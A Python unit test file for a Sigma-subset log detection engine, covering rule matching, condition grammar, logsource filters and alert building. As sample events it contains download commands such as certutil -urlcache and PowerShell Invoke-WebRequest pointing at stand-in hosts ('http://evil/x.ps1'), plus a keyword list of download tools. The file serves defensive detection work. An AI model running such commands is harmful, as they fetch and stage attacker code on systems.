"""Unit tests for the Sigma-subset detection engine (no database needed)."""
from pathlib import Path

from app.detection.engine import (DetectionEngine, Rule, alert_from_match,
                                   flatten_event, load_rules, match_rule)
from app.models import NormalizedEvent

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"


def _match(detection: dict, logsource: dict | None = None, **fields) -> bool:
    fields.setdefault("vendor", "v")
    rule = Rule(id="t", title="t", level="low", description="",
                logsource=logsource or {}, detection=detection)
    return match_rule(rule, flatten_event(NormalizedEvent(event_time=None, **fields)))


# ── value / selection matching ──────────────────────────────────────────────
def test_equals_and_contains():
    assert _match({"s": {"action": "deny"}, "condition": "s"}, action="deny")
    assert not _match({"s": {"action": "deny"}, "condition": "s"}, action="allow")
    assert _match({"s": {"message|contains": "failed"}, "condition": "s"},
                  message="Logon failed for user")


def test_value_list_is_or_and_all_modifier_is_and():
    d = {"s": {"action": ["allow", "accept"]}, "condition": "s"}
    assert _match(d, action="accept") and not _match(d, action="drop")
    allmode = {"s": {"message|contains|all": ["alpha", "beta"]}, "condition": "s"}
    assert _match(allmode, message="alpha and beta here")
    assert not _match(allmode, message="only alpha")


def test_wildcard_startswith_and_null():
    assert _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="FIN-WS-014")
    assert not _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="HR-1")
    assert _match({"s": {"user_name": None}, "condition": "s"})            # field absent


def test_keywords_search_all_fields():
    d = {"k": ["certutil", "bitsadmin"], "condition": "k"}
    assert _match(d, message="cmd /c certutil -urlcache -f http://x/y.exe")
    assert not _match(d, message="nothing to see")


# ── condition grammar ───────────────────────────────────────────────────────
def test_condition_and_not():
    d = {"a": {"action": "deny"}, "b": {"protocol": "tcp"}, "condition": "a and not b"}
    assert _match(d, action="deny", protocol="udp")
    assert not _match(d, action="deny", protocol="tcp")


def test_condition_one_of_and_all_of_wildcard():
    d = {"sel_x": {"action": "deny"}, "sel_y": {"action": "drop"}, "condition": "1 of sel_*"}
    assert _match(d, action="drop") and not _match(d, action="allow")
    d2 = {"sel_x": {"action": "deny"}, "sel_y": {"protocol": "tcp"}, "condition": "all of sel_*"}
    assert _match(d2, action="deny", protocol="tcp")
    assert not _match(d2, action="deny", protocol="udp")


def test_logsource_filters_by_vendor_and_logtype():
    d = {"s": {"action": "failed-logon"}, "condition": "s"}
    ls = {"vendor": "microsoft", "log_type": "security"}
    assert _match(d, ls, vendor="microsoft", log_type="security", action="failed-logon")
    # wrong vendor -> no match even though the selection would hit
    assert not _match(d, ls, vendor="cisco", log_type="security", action="failed-logon")


# ── the shipped rule library ────────────────────────────────────────────────
def test_rules_load_with_mitre_tags():
    rules = load_rules(RULES_DIR)
    ids = {r.id for r in rules}
    assert {"lo-win-failed-logon", "lo-rdp-allowed", "lo-ingress-tool-transfer",
            "lo-clear-eventlog"} <= ids
    flog = next(r for r in rules if r.id == "lo-win-failed-logon")
    assert "T1110" in flog.techniques and "credential access" in flog.tactics


def test_engine_fires_expected_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-win-failed-logon" in hits(vendor="microsoft", log_type="security",
                                         action="failed-logon")
    rdp = hits(vendor="paloalto", dst_port=3389, action="allow")
    assert "lo-rdp-allowed" in rdp
    assert "lo-rdp-allowed" not in hits(vendor="paloalto", dst_port=3389, action="deny")
    assert "lo-ingress-tool-transfer" in hits(
        vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")
    assert "lo-clear-eventlog" in hits(vendor="microsoft", raw={"EventID": 1102})


def test_alert_from_match_builds_row():
    rule = next(r for r in load_rules(RULES_DIR) if r.id == "lo-win-failed-logon")
    evt = NormalizedEvent(event_time=None, vendor="microsoft", log_type="security",
                          action="failed-logon", user_name="CORP\\jdoe",
                          src_ip="45.83.122.7", message="x" * 5000)
    a = alert_from_match(rule, evt, dedup_hash="abc123", batch_id=7)
    assert a["rule_id"] == "lo-win-failed-logon" and a["level"] == "low"
    assert "T1110" in a["techniques"] and "credential access" in a["tactics"]
    assert a["src_ip"] == "45.83.122.7" and a["user_name"] == "CORP\\jdoe"
    assert a["dedup_hash"] == "abc123" and a["batch_id"] == 7
    assert len(a["message"]) == 1000          # truncated for storage
